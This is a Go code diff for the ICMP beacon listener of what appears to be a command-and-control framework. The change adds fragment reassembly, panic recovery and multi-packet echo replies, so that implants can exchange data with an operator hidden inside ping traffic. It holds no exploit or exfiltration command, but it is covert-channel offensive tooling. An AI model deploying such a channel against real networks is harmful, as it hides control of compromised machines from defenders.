@@ -1,10 +1,13 @@
 package server
 
 import (
+	"fmt"
 	"log/slog"
 	"net"
+	"runtime/debug"
 	"sync"
 
+	"github.com/forgec2/forgec2/pkg/protocol"
 	"golang.org/x/net/icmp"
 	"golang.org/x/net/ipv4"
 )
@@ -16,13 +19,14 @@ type ICMPBeaconListener struct {
 	mu      sync.Mutex
 	wg      sync.WaitGroup
 	started bool
+	asm     *protocol.ICMPAssembler
 }
 
 func NewICMPBeaconListener(addr string) *ICMPBeaconListener {
 	if addr == "" {
 		addr = "0.0.0.0"
 	}
-	return &ICMPBeaconListener{addr: addr}
+	return &ICMPBeaconListener{addr: addr, asm: protocol.NewICMPAssembler()}
 }
 
 func (l *ICMPBeaconListener) SetHandler(h func(agentID string, reqJSON []byte) []byte) {
@@ -57,20 +61,20 @@ func (l *ICMPBeaconListener) Stop() {
 	}
 }
 
-// Close implements io.Closer for use with extraListeners map.
 func (l *ICMPBeaconListener) Close() error {
 	l.Stop()
 	return nil
 }
 
 func (l *ICMPBeaconListener) serve() {
-	buf := make([]byte, 1500)
+	buf := make([]byte, 8192)
 	for {
 		n, peer, err := l.conn.ReadFrom(buf)
 		if err != nil {
 			if netErr, ok := err.(net.Error); ok && netErr.Temporary() {
 				continue
 			}
+			slog.Error("ICMP read error (listener stopping)", "err", err)
 			return
 		}
 
@@ -78,47 +82,67 @@ func (l *ICMPBeaconListener) serve() {
 		if err != nil {
 			continue
 		}
-
 		if msg.Type != ipv4.ICMPTypeEcho {
 			continue
 		}
-
 		echo, ok := msg.Body.(*icmp.Echo)
 		if !ok || len(echo.Data) == 0 {
 			continue
 		}
 
-		// Extract agent ID from first 36 bytes (UUID) or use peer IP
-		agentID := peer.String()
-		if len(echo.Data) >= 36 {
-			agentID = string(echo.Data[:36])
+		payload := echo.Data
+		if !protocol.ICMPMaybePlain(payload) {
+			msgID, total, index, chunk, ok := protocol.ICMPFragParse(payload)
+			if !ok {
+				continue
+			}
+			key := fmt.Sprintf("%s:%d:%d", peer.String(), echo.ID, msgID)
+			assembled, err := l.asm.Add(key, total, index, chunk)
+			if err != nil || assembled == nil {
+				continue
+			}
+			payload = assembled
 		}
 
-		// Handle beacon
+		agentID := peer.String()
 		l.mu.Lock()
 		h := l.handler
 		l.mu.Unlock()
-
 		if h == nil {
 			continue
 		}
+		respData := func() (resp []byte) {
+			defer func() {
+				if r := recover(); r != nil {
+					slog.Error("ICMP handler panic", "err", r, "stack", string(debug.Stack()))
+				}
+			}()
+			return h(agentID, payload)
+		}()
+		if respData == nil {
+			continue
+		}
 
-		respData := h(agentID, echo.Data)
-
-		// Send ICMP echo reply with response data
-		if respData != nil {
+		frags := protocol.ICMPFragSplit(respData)
+		if len(frags) == 0 {
+			frags = [][]byte{respData}
+		}
+		for i, f := range frags {
 			reply := icmp.Message{
 				Type: ipv4.ICMPTypeEchoReply,
 				Code: 0,
 				Body: &icmp.Echo{
 					ID:   echo.ID,
-					Seq:  echo.Seq,
-					Data: respData,
+					Seq:  echo.Seq + i,
+					Data: f,
 				},
 			}
 			rb, err := reply.Marshal(nil)
-			if err == nil {
-				l.conn.WriteTo(rb, peer)
+			if err != nil {
+				continue
+			}
+			if _, err := l.conn.WriteTo(rb, peer); err != nil {
+				slog.Debug("ICMP write reply failed", "peer", peer, "err", err)
 			}
 		}
 	}
